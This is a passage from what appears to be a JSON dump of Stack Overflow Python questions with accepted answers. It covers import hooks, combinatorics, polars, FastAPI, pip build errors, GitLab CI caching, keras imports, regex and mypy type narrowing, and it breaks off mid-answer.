lazy_import('slowmodule')\n\nwould be necessary.\nOutside of the single additional level of indirection on module member access (and the two minor version availability difference), it's not immediately clear to me what, if anything, there is to be gained from this approach over the previous proxy module method, however.\n\nUse importlib's Finder/Loader machinery to hook import (don't do this)\nYou could create a custom module Finder/Loader that would (only) hook your slowmodule import and, instead load, for example your proxy module.\nThen you could just import that \"importhook\" module before you imported slowmode in your tests, e.g.\nimport myimporthooks\nimport slowmodule\n\ndef test_foo():\n    ...\n\n(Here, myimporthooks would use importlib's finder and loader machinery to do something simlar to the importhook package but intercept and redirect the import attempt rather than just serving as an import callback.)\nBut this is crazy.  Not only is what you want (seemingly) achievable through (infinitely) more common and supported methods, but it's incredibly fragile, error-prone and, without diving into the internals of PyTest (which may mess with module loaders itself), it's hard to say whether it'd even work.\n"
}
{
    "Id": 71697019,
    "PostTypeId": 1,
    "Title": "generating list of every combination without duplicates",
    "Body": "I would like to generate a list of combinations. I will try to simplify my problem to make it understandable.\nWe have 3 variables :\n\nx : number of letters\nk : number of groups\nn : number of letters per group\n\nI would like to generate using python a list of every possible combinations, without any duplicate knowing that : i don't care about the order of the groups and the order of the letters within a group.\nAs an example, with x = 4, k = 2, n = 2 :\n# we start with 4 letters, we want to make 2 groups of 2 letters\nletters = ['A','B','C','D']\n\n# here would be a code that generate the list\n\n# Here is the result that is very simple, only 3 combinations exist.\ncombos = [ ['AB', 'CD'], ['AC', 'BD'], ['AD', 'BC'] ]\n\nSince I don't care about the order of or within the groups, and letters within a group, ['AB', 'CD'] and ['DC', 'BA'] is a duplicate.\nThis is a simplification of my real problem, which has those values : x = 12, k = 4, n = 3. I tried to use some functions from itertools, but with that many letters my computer freezes because it's too many combinations.\nAnother way of seeing the problem : you have 12 players, you want to make 4 teams of 3 players. What are all the possibilities ?\nCould anyone help me to find an optimized solution to generate this list?\n",
    "AcceptedAnswerId": 71699012,
    "AcceptedAnswer": "There will certainly be more sophisticated/efficient ways of doing this, but here's an approach that works in a reasonable amount of time for your example and should be easy enough to adapt for other cases.\nIt generates unique teams and unique combinations thereof, as per your specifications.\nfrom itertools import combinations\n\n# this assumes that team_size * team_num == len(players) is a given\nteam_size = 3\nteam_num = 4\nplayers = list('ABCDEFGHIJKL')\nunique_teams = [set(c) for c in combinations(players, team_size)]\n\ndef duplicate_player(combo):\n    \"\"\"Returns True if a player occurs in more than one team\"\"\"\n    return len(set.union(*combo)) < len(players)\n    \nresult = (combo for combo in combinations(unique_teams, team_num) if not duplicate_player(combo))\n\nresult is a generator that can be iterated or turned into a list with list(result). On kaggle.com, it takes a minute or so to generate the whole list of all possible combinations (a total of 15400, in line with the computations by @beaker and @John Coleman in the comments). The teams are tuples of sets that look like this:\n[({'A', 'B', 'C'}, {'D', 'E', 'F'}, {'G', 'H', 'I'}, {'J', 'K', 'L'}),\n ({'A', 'B', 'C'}, {'D', 'E', 'F'}, {'G', 'H', 'J'}, {'I', 'K', 'L'}),\n ({'A', 'B', 'C'}, {'D', 'E', 'F'}, {'G', 'H', 'K'}, {'I', 'J', 'L'}),\n ...\n]\n\nIf you want, you can cast them into strings by calling ''.join() on each of them.\n"
}
{
    "Id": 71196661,
    "PostTypeId": 1,
    "Title": "What is the equivalent of `DataFrame.drop_duplicates()` from pandas in polars?",
    "Body": "What is the equivalent of drop_duplicates() from pandas in polars?\nimport polars as pl\ndf = pl.DataFrame({\"a\":[1,1,2], \"b\":[2,2,3], \"c\":[1,2,3]})\ndf\n\nOutput:\nshape: (3, 3)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 a   \u2506 b   \u2506 c   \u2502\n\u2502 --- \u2506 --- \u2506 --- \u2502\n\u2502 i64 \u2506 i64 \u2506 i64 \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 1   \u2506 2   \u2506 1   \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 2   \u2506 2   \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 3   \u2506 3   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2518\n\nCode:\ndf.drop_duplicates([\"a\", \"b\"])\n\nDelivers the following error:\nAttributeError: drop_duplicates not found\n",
    "AcceptedAnswerId": 71196662,
    "AcceptedAnswer": "The right function name is .unique()\nimport polars as pl\ndf = pl.DataFrame({\"a\":[1,1,2], \"b\":[2,2,3], \"c\":[1,2,3]})\ndf.unique(subset=[\"a\",\"b\"])\n\nAnd this delivers the right output:\nshape: (2, 3)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 a   \u2506 b   \u2506 c   \u2502\n\u2502 --- \u2506 --- \u2506 --- \u2502\n\u2502 i64 \u2506 i64 \u2506 i64 \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 1   \u2506 2   \u2506 1   \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 3   \u2506 3   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2518\n\n"
}
{
    "Id": 71287550,
    "PostTypeId": 1,
    "Title": "Repeatedly removing the maximum average subarray",
    "Body": "I have an array of positive integers. For example:\n[1, 7, 8, 4, 2, 1, 4]\n\nA \"reduction operation\" finds the array prefix with the highest average, and deletes it. Here, an array prefix means a contiguous subarray whose left end is the start of the array, such as [1] or [1, 7] or [1, 7, 8] above. Ties are broken by taking the longer prefix.\nOriginal array:  [  1,   7,   8,   4,   2,   1,   4]\n\nPrefix averages: [1.0, 4.0, 5.3, 5.0, 4.4, 3.8, 3.9]\n\n-> Delete [1, 7, 8], with maximum average 5.3\n-> New array -> [4, 2, 1, 4]\n\nI will repeat the reduction operation until the array is empty:\n[1, 7, 8, 4, 2, 1, 4]\n^       ^\n[4, 2, 1, 4]\n^ ^\n[2, 1, 4]\n^       ^\n[]\n\nNow, actually performing these array modifications isn't necessary; I'm only looking for the list of lengths of prefixes that would be deleted by this process, for example, [3, 1, 3] above.\nWhat is an efficient algorithm for computing these prefix lengths?\n\nThe naive approach is to recompute all sums and averages from scratch in every iteration for an O(n^2) algorithm-- I've attached Python code for this below. I'm looking for any improvement on this approach-- most preferably, any solution below O(n^2), but an algorithm with the same complexity but better constant factors would also be helpful.\nHere are a few of the things I've tried (without success):\n\nDynamically maintaining prefix sums, for example with a Binary Indexed Tree. While I can easily update prefix sums or find a maximum prefix sum in O(log n) time, I haven't found any data structure which can update the average, as the denominator in the average is changing.\nReusing the previous 'rankings' of prefix averages-- these rankings can change, e.g. in some array, the prefix ending at index 5 may have a larger average than the prefix ending at index 6, but after removing the first 3 elements, now the prefix ending at index 2 may have a smaller average than the one ending at 3.\nLooking for patterns in where prefixes end; for example, the rightmost element of any max average prefix is always a local maximum in the array, but it's not clear how much this helps.\n\n\nThis is a working Python implementation of the naive, quadratic method:\nfrom fractions import Fraction\ndef find_array_reductions(nums: List[int]) -> List[int]:\n    \"\"\"Return list of lengths of max average prefix reductions.\"\"\"\n\n    def max_prefix_avg(arr: List[int]) -> Tuple[float, int]:\n        \"\"\"Return value and length of max average prefix in arr.\"\"\"\n        if len(arr) == 0:\n            return (-math.inf, 0)\n\n        best_length = 1\n        best_average = Fraction(0, 1)\n        running_sum = 0\n\n        for i, x in enumerate(arr, 1):\n            running_sum += x\n            new_average = Fraction(running_sum, i)\n            if new_average >= best_average:\n                best_average = new_average\n                best_length = i\n\n        return (float(best_average), best_length)\n\n    removed_lengths = []\n    total_removed = 0\n\n    while total_removed < len(nums):\n        _, new_removal = max_prefix_avg(nums[total_removed:])\n        removed_lengths.append(new_removal)\n        total_removed += new_removal\n\n    return removed_lengths\n\n\nEdit: The originally published code had a rare error with large inputs from using Python's math.isclose() with default parameters for floating point comparison, rather than proper fraction comparison. This has been fixed in the current code. An example of the error can be found at this Try it online link, along with a foreword explaining exactly what causes this bug, if you're curious.\n",
    "AcceptedAnswerId": 71288237,
    "AcceptedAnswer": "This problem has a fun O(n) solution.\nIf you draw a graph of cumulative sum vs index, then:\nThe average value in the subarray between any two indexes is the slope of the line between those points on the graph.\nThe first highest-average-prefix will end at the point that makes the highest angle from 0.  The next highest-average-prefix must then have a smaller average, and it will end at the point that makes the highest angle from the first ending.  Continuing to the end of the array, we find that...\nThese segments of highest average are exactly the segments in the upper convex hull of the cumulative sum graph.\nFind these segments using the monotone chain algorithm.  Since the points are already sorted, it takes O(n) time.\n# Lengths of the segments in the upper convex hull\n# of the cumulative sum graph\ndef upperSumHullLengths(arr):\n    if len(arr) < 2:\n        if len(arr) < 1:\n            return []\n        else:\n            return [1]\n    \n    hull = [(0, 0),(1, arr[0])]\n    for x in range(2, len(arr)+1):\n        # this has x coordinate x-1\n        prevPoint = hull[len(hull) - 1]\n        # next point in cumulative sum\n        point = (x, prevPoint[1] + arr[x-1])\n        # remove points not on the convex hull\n        while len(hull) >= 2:\n            p0 = hull[len(hull)-2]\n            dx0 = prevPoint[0] - p0[0]\n            dy0 = prevPoint[1] - p0[1]\n            dx1 = x - prevPoint[0]\n            dy1 = point[1] - prevPoint[1]\n            if dy1*dx0 < dy0*dx1:\n                break\n            hull.pop()\n            prevPoint = p0\n        hull.append(point)\n    \n    return [hull[i+1][0] - hull[i][0] for i in range(0, len(hull)-1)]\n\n\nprint(upperSumHullLengths([  1,   7,   8,   4,   2,   1,   4]))\n\nprints:\n[3, 1, 3]\n\n"
}
{
    "Id": 71758114,
    "PostTypeId": 1,
    "Title": "Python list comprehension with complex data structures",
    "Body": "I'm trying to flatten some mixed arrays in Python using LC. I'm having some trouble figuring out how to structure it.\nHere's the array's i'm trying to flatten\narr_1 = [1, [2, 3], 4, 5]\narr_2 = [1,[2,3],[[4,5]]]\n\nI tried this methods for arr_1 but get \"TypeError: 'int' object is not iterable\"\nprint([item if type(items) is list else items for items in arr_1 for item in items])\n\nSo I decided to break it into parts to see where it's failing by using this\ndef check(item):\nreturn item;\n\nprint([check(item) if type(items) is list else check(items) for items in [1, [2, 3], 4, 5] for items in arr_2]) \n\nThrough the debugger I found that it's failing at the 2d array in\nfor items in [1, [2, 3], 4, 5]\n\nI don't need the LC to be in one line but I just wanted to know how to do it in a single nested LC if its even possible.\n",
    "AcceptedAnswerId": 71758467,
    "AcceptedAnswer": "Using an internal stack and iter's second form to simulate a while loop:\ndef flatten(obj):\n    return [x\n            for stack in [[obj]]\n            for x, in iter(lambda: stack and [stack.pop()], [])\n            if isinstance(x, int)\n            or stack.extend(reversed(x))]\n\nprint(flatten([1, [2, 3], 4, 5]))\nprint(flatten([1, [2, 3], [[4, 5]]]))\nprint(flatten([1, [2, [], 3], [[4, 5]]]))\n\nOutput (Try it online!):\n[1, 2, 3, 4, 5]\n[1, 2, 3, 4, 5]\n[1, 2, 3, 4, 5]\n\nSlight variation, splitting the \"long\" line into two (Try it online!):\ndef flatten(obj):\n    return [x\n            for stack in [[obj]]\n            for _ in iter(lambda: stack, [])\n            for x in [stack.pop()]\n            if isinstance(x, int)\n            or stack.extend(reversed(x))]\n\nTo explain it a bit, here's roughly the same with ordinary code:\ndef flatten(obj):\n    result = []\n    stack = [obj]\n    while stack:\n        x = stack.pop()\n        if isinstance(x, int):\n            result.append(x)\n        else:\n            stack.extend(reversed(x))\n    return result\n\nIf the order doesn't matter, we can use a queue instead (inspired by 0x263A's comment), although it's less memory-efficient (Try it online!):\ndef flatten(obj):\n    return [x\n            for queue in [[obj]]\n            for x in queue\n            if isinstance(x, int) or queue.extend(x)]\n\nWe can fix the order if instead of putting each list's contents at the end of the queue, we insert them right after the list (which is less time-efficient) in the \"priority\" queue (Try it online!):\ndef flatten(obj):\n    return [x\n            for pqueue in [[obj]]\n            for i, x in enumerate(pqueue, 1)\n            if isinstance(x, int) or pqueue.__setitem__(slice(i, i), x)]\n\n"
}
{
    "Id": 71079342,
    "PostTypeId": 1,
    "Title": "How can I take comma separated inputs for python AnyTree module?",
    "Body": "Community. I need to accept multiple comma-separated inputs to produce a summary of information ( specifically, how many different employees participated in each group/project)? The program takes employees, managers and groups in the form of strings.\nI'm using anytree python library to be able to search/count the occurrence of each employee per group. However, this program is only accepting one value/cell at a time instead of multiple values. \nHere is the tree structure and how I accept input values?\nPress q to exit, Enter your data: Joe\nPress q to exit, Enter your data: Manager1\nPress q to exit, Enter your data: Group1\nPress q to exit, Enter your data: Charles \nPress q to exit, Enter your data: Manager1\nPress q to exit, Enter your data: Group2\nPress q to exit, Enter your data: Joe\nPress q to exit, Enter your data: Manager3\nPress q to exit, Enter your data: Group1\nPress q to exit, Enter your data: Charles\nPress q to exit, Enter your data: Manager3\nPress q to exit, Enter your data: Group1\nPress q to exit, Enter your data: Joe\nPress q to exit, Enter your data: Manager5\nPress q to exit, Enter your data: Group2\nPress q to exit, Enter your data: q\nEmployee   No of groups\n   JOE       2\n   CHARLES       2\nGroup\n\u251c\u2500\u2500 GROUP1\n\u2502   \u251c\u2500\u2500 JOE\n\u2502   \u2502   \u2514\u2500\u2500 MANAGER1\n\u2502   \u251c\u2500\u2500 JOE\n\u2502   \u2502   \u2514\u2500\u2500 MANAGER3\n\u2502   \u2514\u2500\u2500 CHARLES\n\u2502       \u2514\u2500\u2500 MANAGER3\n\u2514\u2500\u2500 GROUP2\n    \u251c\u2500\u2500 CHARLES\n    \u2502   \u2514\u2500\u2500 MANAGER1\n    \u2514\u2500\u2500 JOE\n        \u2514\u2500\u2500 MANAGER5\n\nI need help with this code so that It can accept comma-separated values; for example, to enter Joe, Manager1, Group1 at a time.\nimport anytree\n\nfrom anytree import Node, RenderTree, LevelOrderIter, LevelOrderGroupIter, PreOrderIter\n\nimport sys\n\n# user input\nio=''\nlst_input = []\nwhile (io!='q'):\n    io=input('Press q to exit, Enter your data: ')\n    if io!='q':\n        lst_input.append(io.upper())\n\n# change list in to matrix\nlst=[]\nfor i in range(0, len(lst_input), 3):\n    lst.append(lst_input[i:i + 3])\n\nlst\n\n# create tree structure from lst\ngroup = Node('Group')\nstoreGroup = {}\nfor i in range(len(lst)):\n    if lst[i][2] in [x.name for x in group.children]: # parent already exist, append childrens\n        storeGroup[lst[i][0]] = Node(lst[i][0], parent=storeGroup[lst[i][2]])\n        storeGroup[lst[i][1]] = Node(lst[i][1], parent=storeGroup[lst[i][0]])\n    else: # create parent and append childreds\n        storeGroup[lst[i][2]] = Node(lst[i][2], parent=group)\n        storeGroup[lst[i][0]] = Node(lst[i][0], parent=storeGroup[lst[i][2]])\n        storeGroup[lst[i][1]] = Node(lst[i][1], parent=storeGroup[lst[i][0]])\n\n\nstore = {}\nfor children in LevelOrderIter(group, maxlevel=3):\n    if children.parent!=None and children.parent.name!='Group':\n        if children.name not in store:\n            store[children.name] = {children.parent.name}\n        else:\n            store[children.name] = store[children.name] | {children.parent.name}\n\nprint('Employee', '  No of groups')\nfor i in store:\n    print('   '+i+'      ', len(store[i]))\n\n\nfor pre,fill, node in RenderTree(group):\n    print('{}{}'.format(pre,node.name))\n\n Thank you! Any thoughts are welcomed.\n",
    "AcceptedAnswerId": 71110010,
    "AcceptedAnswer": "Leverage unpacking to extract elements. Then the if statement can be re-written this way.\nif io!='q':\n    name, role, grp = io.upper(). split(',')\n    lst_input.append([name,role, grp]) \n\nyou also need to change lst.append(lst_input[i:i + 3]) in the for loop to this.\nlst.append(lst_input[0][i:i + 3])\n\n"
}
{
    "Id": 71203579,
    "PostTypeId": 1,
    "Title": "How to return a csv file/Pandas DataFrame in JSON format using FastAPI?",
    "Body": "I have a .csv file that I would like to render in a FastAPI app. I only managed to render the .csv file  in JSON format as follows:\ndef transform_question_format(csv_file_name):\n\n    json_file_name = f\"{csv_file_name[:-4]}.json\"\n\n    # transforms the csv file into json file\n    pd.read_csv(csv_file_name ,sep=\",\").to_json(json_file_name)\n\n    with open(json_file_name, \"r\") as f:\n        json_data = json.load(f)\n\n    return json_data\n\n@app.get(\"/questions\")\ndef load_questions():\n\n    question_json = transform_question_format(question_csv_filename)\n\n    return question_json\n\nWhen I tried returning directly pd.read_csv(csv_file_name ,sep=\",\").to_json(json_file_name), it works, as it returns a string.\nHow should I proceed?  I believe this is not the good way to do it.\n",
    "AcceptedAnswerId": 71205127,
    "AcceptedAnswer": "The below shows four different ways of returning the data stored in a .csv file/Pandas DataFrame (for solutions without using Pandas DataFrame, have a look here). Related answers on how to efficiently return a large dataframe can be found here and here as well.\nOption 1\nThe first option is to convert the file data into JSON and then parse it into a dict. You can optionally change the orientation of the data using the orient parameter in the .to_json() method.\nNote: Better not to use this option. See Updates below.\nfrom fastapi import FastAPI\nimport pandas as pd\nimport json\n\napp = FastAPI()\ndf = pd.read_csv(\"file.csv\")\n\ndef parse_csv(df):\n    res = df.to_json(orient=\"records\")\n    parsed = json.loads(res)\n    return parsed\n    \n@app.get(\"/questions\")\ndef load_questions():\n    return parse_csv(df)\n\n\nUpdate 1: Using .to_dict() method would be a better option, as it would return a dict directly, instead of converting the DataFrame into JSON (using df.to_json()) and then that JSON string into dict (using json.loads()), as described earlier. Example:\n@app.get(\"/questions\")\ndef load_questions():\n    return df.to_dict(orient=\"records\")\n\n\nUpdate 2: When using .to_dict() method and returning the dict, FastAPI, behind the scenes, automatically converts that return value into JSON, after converting it into JSON-compatible data first, using the jsonable_encoder, and then putting that JSON-compatible data inside of a JSONResponse (see this answer for more details). Thus, to avoid that extra processing, you could still use the .to_json() method, but this time, put the JSON string in a custom Response and return it directly, as shown below:\nfrom fastapi import Response\n\n@app.get(\"/questions\")\ndef load_questions():\n    return Response(df.to_json(orient=\"records\"), media_type=\"application/json\")\n\n\n\nOption 2\nAnother option is to return the data in string format, using .to_string() method.\n@app.get(\"/questions\")\ndef load_questions():\n    return df.to_string()\n\nOption 3\nYou could also return the data as an HTML table, using .to_html() method.\nfrom fastapi.responses import HTMLResponse\n\n@app.get(\"/questions\")\ndef load_questions():\n    return HTMLResponse(content=df.to_html(), status_code=200)\n\nOption 4\nFinally, you can always return the file as is using FastAPI's FileResponse.\nfrom fastapi.responses import FileResponse\n\n@app.get(\"/questions\")\ndef load_questions():\n    return FileResponse(path=\"file.csv\", filename=\"file.csv\")\n\n"
}
{
    "Id": 71295840,
    "PostTypeId": 1,
    "Title": "python pip: \"error: legacy-install-failure\"",
    "Body": "I want to install gensim python package via pip install gensim\nBut this error occurs and I have no idea what should I do to solve it.\n      running build_ext\n      building 'gensim.models.word2vec_inner' extension\n      error: Microsoft Visual C++ 14.0 or greater is required. Get it with \"Microsoft C++ Build Tools\": https://visualstudio.microsoft.com/visual-cpp-build-tools/\n      [end of output]\n\n  note: This error originates from a subprocess, and is likely not a problem with pip.\nerror: legacy-install-failure\n\n\u00d7 Encountered error while trying to install package.\n\u2570\u2500> gensim\n\nnote: This is an issue with the package mentioned above, not pip.\nhint: See above for output from the failure.\n\n",
    "AcceptedAnswerId": 71296224,
    "AcceptedAnswer": "If you fail to install plugins,\nyou can download it from other repositories like this one:\nrepository depends on the version of python and the system.\nfor example: for  windows 11(x64) and python 3.10 you should take this file: gensim\u20114.1.2\u2011cp310\u2011cp310\u2011win_amd64.whl\n"
}
{
    "Id": 71759316,
    "PostTypeId": 1,
    "Title": "Easily convert string column to pl.datetime in Polars",
    "Body": "Consider a Polars data frame with a column of str type that indicates the date in the format '27 July 2020'. I would like to convert this column to the polars.datetime type, which is distinct from the Python standard datetime. The following code, using the standard datetime format, works but Polars does not recognise the values in the column as dates.\nimport polars as pl\nfrom datetime import datetime\n\ndf = pd.read_csv('')\ndf = df.with_columns([   \n        pl.col('event_date').apply(lambda x: x.replace(\" \",\"-\"))\\\n                            .apply(lambda x: datetime.strptime(x, '%d-%B-%Y'))\n])\n\n\nSuppose we try to process df further to create a new column indicating the quarter of the year an event took place.\ndf = df.with_columns([\n        pl.col('event_date').apply(lambda x: x.month)\\\n                            .apply(lambda x: 1 if x in range(1,4) else 2 if x in range(4,7) else 3 if x in range(7,10) else 4)\\\n                            .alias('quarter')\n])\n\nThe code returns the following error because it qualifies event_type as dtype Object(\"object\") and not as datetime or polars.datetime\nthread '' panicked at 'dtype Object(\"object\") not supported', src/series.rs:992:24\n--- PyO3 is resuming a panic after fetching a PanicException from Python. ---\nPanicException: Unwrapped panic from Python code\n\n",
    "AcceptedAnswerId": 71759536,
    "AcceptedAnswer": "The easiest way to convert strings to Date/Datetime is to use Polars' own strptime function (rather than the same-named function from Python's datetime module).\nFor example, let's start with this data.\nimport polars as pl\n\ndf = pl.DataFrame({\n    'date_str': [\"27 July 2020\", \"31 December 2020\"]\n})\nprint(df)\n\nshape: (2, 1)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 date_str         \u2502\n\u2502 ---              \u2502\n\u2502 str              \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 27 July 2020     \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 31 December 2020 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nTo convert, use Polars' strptime function.\ndf.with_column(pl.col('date_str').str.strptime(pl.Date, fmt='%d %B %Y').cast(pl.Datetime))\n\nshape: (2, 1)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 date_str            \u2502\n\u2502 ---                 \u2502\n\u2502 datetime[\u03bcs]        \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 2020-07-27 00:00:00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2020-12-31 00:00:00 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nNotice that we did not need to replace spaces with dashes.  I've cast the result as a Datetime (per your question), but you may be able to use a Date instead.\nCurrently, the apply method does not work when the return type is a python Date/Datetime object, but there is a request for this.  That said, it's better to use Polars' strptime.  It will be much faster than calling python datetime code.\nEdit: as of Polars 0.13.19, the apply method will automatically convert Python date/datetime to Polars Date/Datetime.\n"
}
{
    "Id": 71239764,
    "PostTypeId": 1,
    "Title": "How to cache \"poetry install\" for Gitlab CI?",
    "Body": "Is there a way to cache poetry install command in Gitlab CI (.gitlab-ci.yml)?\nFor example, in node yarn there is a way to cache yarn install (https://classic.yarnpkg.com/lang/en/docs/install-ci/ Gitlab section) this makes stages a lot faster.\n",
    "AcceptedAnswerId": 71240277,
    "AcceptedAnswer": "GitLab can only cache things in the working directory and Poetry stores packages elsewhere by default:\n\nDirectory where virtual environments will be created. Defaults to {cache-dir}/virtualenvs ({cache-dir}\\virtualenvs on Windows).\n\nOn my machine, cache-dir is /home/chris/.cache/pypoetry.\nYou can use the virtualenvs.in-project option to change this behaviour:\n\nIf set to true, the virtualenv wil be created and expected in a folder named .venv within the root directory of the project.\n\nSo, something like this should work in your gitlab-ci.yml:\nbefore_script:\n  - poetry config virtualenvs.in-project true\n\ncache:\n  paths:\n    - .venv\n\n"
}
{
    "Id": 71111005,
    "PostTypeId": 1,
    "Title": "ModuleNotFoundError: No module named 'keras.applications.resnet50 on google colab",
    "Body": "I am trying to run an image-based project on colab. I found the project on github. Everything runs fine till I reached the cell with the following code:\nimport keras\nfrom keras.preprocessing.image import ImageDataGenerator\nfrom keras.applications.resnet50 import preprocess_input, ResNet50\nfrom keras.models import Model\nfrom keras.layers import Dense, MaxPool2D, Conv2D\n\nWhen I run it, the following output is observed:\n---------------------------------------------------------------------------\nModuleNotFoundError                       Traceback (most recent call last)\n in ()\n      1 import keras\n      2 from keras.preprocessing.image import ImageDataGenerator\n----> 3 from keras.applications.resnet50 import preprocess_input, ResNet50\n      4 from keras.models import Model\n      5 from keras.layers import Dense, MaxPool2D, Conv2D\n\nModuleNotFoundError: No module named 'keras.applications.resnet50'\n\n---------------------------------------------------------------------------\n\nIt's running 2.7.0 keras, connected to a TPU runtime. I tried !pip installing the said module but no use. I even tried running a demo resnet50 project too but got the same error. Can anyone please help me solve the error?\n",
    "AcceptedAnswerId": 71117585,
    "AcceptedAnswer": "from tensorflow.keras.applications.resnet50 import ResNet50\n\n"
}
{
    "Id": 71297077,
    "PostTypeId": 1,
    "Title": "Python regex replace every 2nd occurrence in a string",
    "Body": "I have a string with data that looks like this:\nstr1 = \"[2.4],[5],[2.54],[4],[3.36],[4.46],[3.36],[4],[3.63],[4.86],[4],[4.63]\"\n\nI would want to replace every second iteration of \"],[\" with \",\" so it will look like this:\nstr2 = \"[2.4,5],[2.54,4],[3.36,4.46],[3.36,4],[3.63,4.86],[4,4.63]\"\n\nHere is was I have so far:\nstr1 = \"[2.4],[5],[2.54],[4],[3.36],[4.46],[3.36],[4],[3.63],[4.86],[4],[4.63]\"\ns2 = re.sub(r\"],\\[\", ',', str1)\nprint(s2)\n\nI was trying to mess around with this:\n(.*?],\\[){2}\n\nBut it does not seem to yield me the desired results.\nI tried using loops but I only managed to replace only the second occurrence and nothing after using this sample code I found here. And the code is:\nimport re\n\ndef replacenth(string, sub, wanted, n):\n    where = [m.start() for m in re.finditer(sub, string)][n-1]\n    before = string[:where]\n    after = string[where:]\n    after = after.replace(sub, wanted, 1)\n    newString = before + after\n    print(newString)\nFor these variables:\n\nstring = 'ababababababababab'\nsub = 'ab'\nwanted = 'CD'\nn = 5\n\nThank you.\n",
    "AcceptedAnswerId": 71297176,
    "AcceptedAnswer": "You can use\nimport re\nfrom itertools import count\n\nstr1 = \"[2.4],[5],[2.54],[4],[3.36],[4.46],[3.36],[4],[3.63],[4.86],[4],[4.63]\"\nc = count(0)\nprint( re.sub(r\"],\\[\", lambda x: \",\" if next(c) % 2 == 0 else x.group(), str1) )\n# => [2.4,5],[2.54,4],[3.36,4.46],[3.36,4],[3.63,4.86],[4,4.63]\n\nSee the Python demo.\nThe regex is the same, ],\\[, it matches a literal ],[ text.\nThe c = count(0)  initializes the counter whose value is incremented upon each match inside a lambda expression used as the replacement argument. When the  counter is even, the match is replaced with a comma, else, it is kept as is.\n"
}
{
    "Id": 71805426,
    "PostTypeId": 1,
    "Title": "how to tell a python type checker that an optional definitely exists?",
    "Body": "I'm used to typescript, in which one can use a ! to tell the type-checker to assume a value won't be null. Is there something analogous when using type annotations in python?\nA (contrived) example:\nWhen executing the expression m.maybe_num + 3 in the code below, the enclosing if guarantees that maybe_num won't be None.  But the type-checker doesn't know that, and returns an error.  (Verified in https://mypy-play.net/?mypy=latest&python=3.10.) How can I tell the type-checker that I know better?\nfrom typing import Optional\n\nclass MyClass:\n\n    def __init__(self, maybe_num: Optional[int]):\n        self.maybe_num = maybe_num\n        \n    def has_a_num(self) -> bool:\n        return self.maybe_num is not None\n\n    def three_more(self) -> Optional[int]:\n        if self.has_a_num:\n            # mypy error: Unsupported operand types for + (\"None\" and \"int\")\n            return self.maybe_num + 3\n        else:\n            return None\n\n",
    "AcceptedAnswerId": 71806921,
    "AcceptedAnswer": "Sadly there's no clean way to infer the type of something from a function call like this, but you can work some magic with TypeGuard annotations for the has_a_num() method, although the benefit from those annotations won't really be felt unless the difference is significantly more major than the type of a single int. If it's just a single value, you should just use a standard  is not None check.\nif self.maybe_num is not None:\n    ...\n\nYou can define a subclass of your primary subclass, where the types of any parameters whose types are affected are explicitly redeclared.\nclass MyIntClass(MyClass):\n    maybe_num: int\n\nFrom there, your checker function should still return a boolean, but the annotated return type tells MyPy that it should use it for type narrowing to the listed type.\nSadly it will only do this for proper function parameters, rather than the implicit self argument, but this can be fixed easily enough by providing self explicitly as follows:\nif MyClass.has_a_num(self):\n    ...\n\nThat syntax is yucky, but it works with MyPy.\nThis makes the full solution be as follows\n# Parse type annotations as strings to avoid \n# circular class references\nfrom __future__ import annotations\nfrom typing import Optional, TypeGuard\n\nclass MyClass:\n    def __init__(self, maybe_num: Optional[int]):\n        self.maybe_num = maybe_num\n\n    def has_a_num(self) -> TypeGuard[_MyClass_Int]:\n        # This annotation defines a type-narrowing operation,\n        # such that if the return value is True, then self\n        # is (from MyPy's perspective) _MyClass_Int, and \n        # otherwise it isn't\n        return self.maybe_num is not None\n\n    def three_more(self) -> Optional[int]:\n        if 